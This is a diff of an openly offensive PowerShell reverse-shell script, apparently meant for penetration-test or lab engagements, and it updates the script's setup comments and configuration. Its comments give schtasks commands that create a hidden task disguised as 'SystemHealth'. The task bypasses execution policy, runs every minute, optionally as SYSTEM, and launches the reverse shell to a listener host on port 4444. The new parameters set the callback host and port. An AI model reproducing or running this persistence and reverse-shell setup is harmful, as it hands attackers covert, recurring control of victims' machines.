@@ -6,20 +6,28 @@
 #
 # SETUP - create scheduled task (run from cmd.exe or PowerShell as current user):
 #
-#   schtasks /create /tn "SystemHealth" /tr "powershell -ep bypass -WindowStyle Hidden -File c:\temp\revshell.ps1" /sc minute /mo 1 /f
+#   schtasks /create /tn "SystemHealth" /tr "powershell -ep bypass -WindowStyle Hidden -File C:\Temp\revshell.ps1 -LHost 10.10.14.5 -LPort 4444" /sc minute /mo 1 /f
 #
 # To run as SYSTEM (requires elevated shell):
-#   schtasks /create /tn "SystemHealth" /tr "powershell -ep bypass -WindowStyle Hidden -File c:\temp\revshell.ps1" /sc minute /mo 1 /ru SYSTEM /f
+#   schtasks /create /tn "SystemHealth" /tr "powershell -ep bypass -WindowStyle Hidden -File C:\Temp\revshell.ps1 -LHost 10.10.14.5 -LPort 4444" /sc minute /mo 1 /ru SYSTEM /f 
 #
 # To delete the task during cleanup:
 #   schtasks /delete /tn "SystemHealth" /f
 # ==============================================================================
 
 # ==============================================================================
-# CONFIGURATION - edit before deploying
+# CONFIGURATION - pass as arguments or fall back to defaults
+# Usage:
+#   .\revshell.ps1 -LHost 10.10.14.5 -LPort 4444
+#   .\revshell.ps1 -LHost 10.10.14.5  (uses default port)
 # ==============================================================================
-$LHOST = "10.10.10.10"
-$LPORT = 4444
+param(
+    [string]$LHost = "10.10.10.10",
+    [int]$LPort = 4444
+)
+
+$LHOST = $LHost
+$LPORT = $LPort
 $WORKDIR = "C:\Temp"
 $LIGOLO_PORT = 11601
 $LIGOLO_PORT_FALLBACK = 443
